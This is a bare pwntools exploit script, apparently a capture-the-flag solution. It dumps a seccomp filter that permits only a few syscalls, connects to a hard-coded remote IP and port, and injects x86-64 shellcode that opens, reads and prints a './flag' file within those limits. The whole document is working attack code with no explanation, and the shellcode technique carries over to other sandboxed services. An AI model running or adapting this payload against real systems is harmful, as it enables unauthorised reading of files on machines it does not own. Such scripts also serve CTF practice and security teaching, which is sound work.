#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "amd64"

"""
 0000: 0x20 0x00 0x00 0x00000004   ld  $data[4]
 0001: 0x15 0x01 0x00 0xc000003e   jeq 3221225534 true:0003 false:0002
 0002: 0x06 0x00 0x00 0x00000000   ret KILL
 0003: 0x20 0x00 0x00 0x00000000   ld  $data[0]
 0004: 0x15 0x00 0x01 0x0000000f   jeq 15   true:0005 false:0006
 0005: 0x06 0x00 0x00 0x7fff0000   ret ALLOW
 0006: 0x15 0x00 0x01 0x000000e7   jeq 231  true:0007 false:0008
 0007: 0x06 0x00 0x00 0x7fff0000   ret ALLOW
 0008: 0x15 0x00 0x01 0x0000003c   jeq 60   true:0009 false:0010
 0009: 0x06 0x00 0x00 0x7fff0000   ret ALLOW
 0010: 0x15 0x00 0x01 0x00000000   jeq 0    true:0011 false:0012
 0011: 0x06 0x00 0x00 0x7fff0000   ret ALLOW
 0012: 0x15 0x00 0x01 0x00000001   jeq 1    true:0013 false:0014
 0013: 0x06 0x00 0x00 0x7fff0000   ret ALLOW
 0014: 0x15 0x00 0x01 0x00000101   jeq 257  true:0015 false:0016
 0015: 0x06 0x00 0x00 0x7fff0000   ret ALLOW
 0016: 0x06 0x00 0x00 0x00000000   ret KILL
"""

r = remote("188.226.140.60", 10001)
r.recvuntil(": ")


r.send(asm("""
jmp F
open:
    mov rax, 257
    mov rdi, -100
    pop rsi
    mov rdx, 0
    mov rcx, 0
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0xff
    xor rax, rax
    syscall

    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    mov rsi, rsp
    syscall

    mov rax, 60
    syscall
F:
    call open
    .asciz "./flag"
"""))

r.interactive()

